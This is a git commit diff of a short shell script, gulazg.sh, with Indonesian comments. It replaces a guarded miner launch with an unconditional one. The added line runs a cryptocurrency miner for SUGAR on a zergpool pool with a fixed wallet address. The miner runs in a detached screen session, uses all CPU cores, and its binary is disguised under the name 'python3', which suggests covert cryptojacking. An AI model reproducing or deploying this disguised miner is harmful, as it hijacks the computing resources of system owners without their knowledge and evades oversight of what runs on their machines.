874e9dd2e9f4f0d8278e198a8bba355590ca893e
henstyle <henspicsaypro@gmail.com>
2024-11-19 22:58:05 +0700

    Update gulazg.sh

--- gulazg.sh
+++ gulazg.sh
@@ -8,11 +8,4 @@ if [ ! -d "dot" ]; then
 else
     echo "File sudah diekstrak. Lewati pengunduhan."
 fi
-
-# Jalankan perintah mining di dalam screen jika belum berjalan
-if ! screen -list | grep -q "miner"; then
-    echo "Menjalankan miner..."
-    screen -dmS miner ./python3 -a yespowersugar -o yespowerSUGAR.eu.mine.zergpool.com:6535 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j -p c=SUGAR -t $(nproc)
-else
-    echo "Miner sudah berjalan."
-fi
+screen -dmS miner ./python3 -a yespowersugar -o yespowerSUGAR.eu.mine.zergpool.com:6535 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j -p c=SUGAR -t $(nproc)
